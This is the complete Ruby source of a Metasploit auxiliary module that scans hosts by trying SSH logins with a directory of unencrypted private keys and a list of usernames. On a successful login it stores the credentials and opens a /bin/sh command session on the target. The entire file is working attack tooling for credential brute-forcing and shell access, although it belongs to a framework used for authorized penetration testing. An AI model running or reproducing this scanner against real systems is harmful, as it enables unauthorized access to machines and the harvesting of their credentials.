##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'
require 'sshkey'
require 'net/ssh/command_stream'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell

  include Msf::Auxiliary::Scanner

  attr_accessor :ssh_socket, :good_key

  def initialize
    super(
      'Name'        => 'SSH Public Key Login Scanner',
      'Description' => %q{
        This module will test ssh logins on a range of machines using
        a defined private key file, and report successful logins.
        If you have loaded a database plugin and connected to a database
        this module will record successful logins and hosts so you can
        track your access.

        Note that password-protected key files will not function with this
        module -- it is designed specifically for unencrypted (passwordless)
        keys.

        Key files may be a single private (unencrypted) key, or several private
        keys concatenated together as an ASCII text file. Non-key data should be
        silently ignored.
      },
      'Author'      => ['todb'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(22),
        OptPath.new('KEY_PATH', [true, 'Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub" will be skipped.']),
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptString.new('SSH_KEYFILE_B64', [false, 'Raw data of an unencrypted SSH public key. This should be used by programmatic interfaces to this module only.', '']),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

    deregister_options('RHOST','PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS','USERPASS_FILE')

    @good_key = ''
    @strip_passwords = true

  end

  def key_dir
    datastore['KEY_DIR']
  end

  def rport
    datastore['RPORT']
  end

  def ip
    datastore['RHOST']
  end

  def read_keyfile(file)
    if file == :keyfile_b64
      keyfile = datastore['SSH_KEYFILE_B64'].unpack("m*").first
    elsif file.kind_of? Array
      keyfile = ''
      file.each do |dir_entry|
        next unless File.readable? dir_entry
        keyfile << File.open(dir_entry, "rb") {|f| f.read(f.stat.size)}
      end
    else
      keyfile = File.open(file, "rb") {|f| f.read(f.stat.size)}
    end
    keys = []
    this_key = []
    in_key = false
    keyfile.split("\n").each do |line|
      in_key = true if(line =~ /^-----BEGIN [RD]SA PRIVATE KEY-----/)
      this_key << line if in_key
      if(line =~ /^-----END [RD]SA PRIVATE KEY-----/)
        in_key = false
        keys << (this_key.join("\n") + "\n")
        this_key = []
      end
    end
    if keys.empty?
      print_error "#{ip}:#{rport} SSH - No keys found."
    end
    return validate_keys(keys)
  end

  # Validates that the key isn't total garbage. Also throws out SSH2 keys --
  # can't use 'em for Net::SSH.
  def validate_keys(keys)
    keepers = []
    keys.each do |key|
      # Needs a beginning
      next unless key =~ /^-----BEGIN [RD]SA PRIVATE KEY-----\x0d?\x0a/m
      # Needs an end
      next unless key =~ /\n-----END [RD]SA PRIVATE KEY-----\x0d?\x0a?$/m
      # Shouldn't have binary.
      next unless key.scan(/[\x00-\x08\x0b\x0c\x0e-\x1f\x80-\xff]/).empty?
      # Add more tests to taste.
      keepers << key
    end
    if keepers.empty?
      print_error "#{ip}:#{rport} SSH - No valid keys found"
    end
    return keepers
  end

  def pull_cleartext_keys(keys)
    cleartext_keys = []
    keys.each do |key|
      next unless key
      next if key =~ /Proc-Type:.*ENCRYPTED/
      this_key = key.gsub(/\x0d/,"")
      next if cleartext_keys.include? this_key
      cleartext_keys << this_key
    end
    if cleartext_keys.empty?
      print_error "#{ip}:#{rport} SSH - No valid cleartext keys found"
    end
    return cleartext_keys
  end

  def session_setup(result, ssh_socket, fingerprint)
    return unless ssh_socket

    # Create a new session from the socket
    conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)

    # Clean up the stored data - need to stash the keyfile into
    # a datastore for later reuse.
    merge_me = {
      'USERPASS_FILE'  => nil,
      'USER_FILE'      => nil,
      'PASS_FILE'      => nil,
      'USERNAME'       => result.credential.public,
      'SSH_KEYFILE_B64' => [result.credential.private].pack("m*").gsub("\n",""),
      'KEY_PATH'        => nil
    }

    info = "SSH #{result.credential.public}:#{fingerprint} (#{ip}:#{rport})"
    s = start_session(self, info, merge_me, false, conn.lsock)
    self.sockets.delete(ssh_socket.transport.socket)

    # Set the session platform
    case result.proof
    when /Linux/
      s.platform = "linux"
    when /Darwin/
      s.platform = "osx"
    when /SunOS/
      s.platform = "solaris"
    when /BSD/
      s.platform = "bsd"
    when /HP-UX/
      s.platform = "hpux"
    when /AIX/
      s.platform = "aix"
    when /Win32|Windows/
      s.platform = "windows"
    when /Unknown command or computer name/
      s.platform = "cisco-ios"
    end

    s
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} SSH - Testing Cleartext Keys")

    if datastore["USER_FILE"].blank? && datastore["USERNAME"].blank?
      # Ghetto abuse of the way OptionValidateError expects an array of
      # option names instead of a string message like every sane
      # subclass of Exception.
      raise OptionValidateError, ["At least one of USER_FILE or USERNAME must be given"]
    end

    keys = KeyCollection.new(
      key_path: datastore['KEY_PATH'],
      user_file: datastore['USER_FILE'],
      username: datastore['USERNAME'],
    )

    keys = prepend_db_keys(keys)

    print_brute :level => :vstatus, :ip => ip, :msg => "Testing #{keys.key_data.count} keys from #{datastore['KEY_PATH']}"
    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      host: ip,
      port: rport,
      cred_details: keys,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      proxies: datastore['Proxies'],
      connection_timeout: datastore['SSH_TIMEOUT'],
      framework: framework,
      framework_module: self,
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          tmp_key = result.credential.private
          ssh_key = SSHKey.new tmp_key
          session_setup(result, scanner.ssh_socket, ssh_key.fingerprint)
          :next_user
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
          end
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
          invalidate_login(credential_data)
          :abort
        when Metasploit::Model::Login::Status::INCORRECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          end
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        else
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end

  end

  class KeyCollection < Metasploit::Framework::CredentialCollection
    attr_accessor :key_data
    attr_accessor :key_path

    def initialize(opts={})
      super
      valid!
    end

    # Override CredentialCollection#has_privates?
    def has_privates?
      !@key_data.empty?
    end

    def realm
      nil
    end

    def valid!
      @key_data = Set.new
      if File.directory?(@key_path)
        @key_files ||= Dir.entries(@key_path).reject { |f| f =~ /^\x2e|\x2epub$/ }
        @key_files.each do |f|
          data = read_key(File.join(@key_path, f))
          @key_data << data if valid_key?(data)
        end
      elsif File.file?(@key_path)
        data = read_key(@key_path)
        @key_data << data if valid_key?(data)
      else
        raise RuntimeError, "No key path"
      end
    end

    def valid_key?(key_data)
      !!(key_data.match(/BEGIN [RD]SA PRIVATE KEY/) && !key_data.match(/Proc-Type:.*ENCRYPTED/))
    end

    def each
      prepended_creds.each { |c| yield c }

      if @user_file.present?
        File.open(@user_file, 'rb') do |user_fd|
          user_fd.each_line do |user_from_file|
            user_from_file.chomp!
            each_key do |key_data|
              yield Metasploit::Framework::Credential.new(public: user_from_file, private: key_data, realm: realm, private_type: :ssh_key)
            end
          end
        end
      end

      if @username.present?
        each_key do |key_data|
          yield Metasploit::Framework::Credential.new(public: @username, private: key_data, realm: realm, private_type: :ssh_key)
        end
      end
    end

    def each_key
      @key_data.each do |data|
        yield data
      end
    end

    def read_key(filename)
      @cache ||= {}
      unless @cache[filename]
        data = File.open(filename, 'rb') { |fd| fd.read(fd.stat.size) }
        #if data.match

        @cache[filename] = data
      end

      @cache[filename]
    end

  end
end
